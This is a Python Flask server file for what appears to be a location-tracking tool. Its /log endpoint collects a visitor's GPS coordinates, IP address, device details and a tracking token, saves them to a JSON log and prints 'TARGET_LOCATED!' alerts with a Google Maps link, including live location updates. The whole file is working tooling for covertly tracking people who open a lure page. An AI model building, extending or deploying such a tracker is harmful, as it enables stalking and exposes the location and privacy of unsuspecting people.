import os
import json
import datetime
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
from user_agents import parse
from colorama import Fore, Style
from waitress import serve

# Explicitly set paths to avoid issues when running from different directories
base_dir = os.path.abspath(os.path.dirname(__file__))
template_dir = os.path.join(base_dir, 'templates')
static_dir = os.path.join(base_dir, 'static')

app = Flask(__name__, template_folder=template_dir, static_folder=static_dir)
CORS(app)

# Global configuration (will be populated by main.py)
CONFIG = {
    'output': 'logs/capture.json',
    'verbose': True
}

def log_data(data):
    """Saves data to a structured JSON log file."""
    log_file = CONFIG['output']
    
    # Ensure directory exists
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    
    current_logs = []
    if os.path.exists(log_file):
        try:
            with open(log_file, 'r') as f:
                content = f.read().strip()
                if content:
                    current_logs = json.loads(content)
                    if not isinstance(current_logs, list):
                        current_logs = [current_logs]
        except (json.JSONDecodeError, Exception):
            current_logs = []
            
    current_logs.append(data)
    
    with open(log_file, 'w') as f:
        json.dump(current_logs, f, indent=4)

@app.route('/ping')
def ping():
    return "PONG", 200

@app.route('/favicon.ico')
def favicon():
    return '', 204

@app.route('/')
def index():
    try:
        return render_template('index.html')
    except Exception as e:
        import traceback
        print(f"\n{Fore.RED}[TEMPLATE_ERROR]{Fore.WHITE} {str(e)}")
        traceback.print_exc()
        return f"Internal Server Error: {str(e)}", 500

@app.route('/log', methods=['POST'])
def handle_log():
    try:
        data = request.get_json(silent=True) or {}
        
        # Safe IP extraction
        ip = request.headers.get('X-Forwarded-For', request.remote_addr) or '127.0.0.1'
        if ip and ',' in str(ip): 
            ip = str(ip).split(',')[0].strip()

        ua_string = data.get('ua', '')
        user_agent = parse(ua_string)
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = {
            "timestamp": timestamp,
            "token": data.get('token'),
            "ip": ip,
            "latitude": data.get('lat'),
            "longitude": data.get('lon'),
            "accuracy": data.get('acc'),
            "device": {
                "os": user_agent.os.family,
                "browser": user_agent.browser.family,
                "is_mobile": user_agent.is_mobile
            },
            "maps_link": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
        }

        log_data(log_entry)
        
        # Immediate Terminal Output
        is_live = data.get('is_live', False)
        prefix = f"{Fore.YELLOW}[LIVE_SYNC]{Fore.WHITE}" if is_live else f"{Fore.GREEN}[INITIAL_CAPTURE]{Fore.WHITE}"
        
        print(f"{Fore.MAGENTA}{'-'*40}")
        print(f"{prefix} TARGET_LOCATED!")
        print(f"{Fore.CYAN} > IP:      {Fore.WHITE}{ip}")
        print(f"{Fore.CYAN} > COORD:   {Fore.WHITE}{log_entry['latitude']}, {log_entry['longitude']} (+/-{log_entry['accuracy']}m)")
        print(f"{Fore.CYAN} > MAP:     {Fore.YELLOW}{log_entry['maps_link']}")
        print(f"{Fore.CYAN} > DEVICE:  {Fore.WHITE}{log_entry['device']['os']} | {log_entry['device']['browser']}")
        print(f"{Fore.GREEN} > STATUS:  {Fore.WHITE}DATA_VAULT_SYNC_COMPLETE")
        print(f"{Fore.MAGENTA}{'-'*40}\n")
        
        return jsonify({"status": "success", "message": "Logged successfully"})
    except Exception as e:
        import traceback
        print(f"\n{Fore.RED}[LOG_ERROR]{Fore.WHITE} {str(e)}")
        traceback.print_exc()
        return jsonify({"status": "error", "message": str(e)}), 500

def run_server(port, output, verbose):
    CONFIG['output'] = output
    CONFIG['verbose'] = verbose
    
    # Clean output in terminal
    print(f"\n{Fore.CYAN}[SERVER]{Fore.WHITE} Initializing Waitress Production Engine on port {port}...")
    
    serve(app, host='0.0.0.0', port=port, _quiet=True)
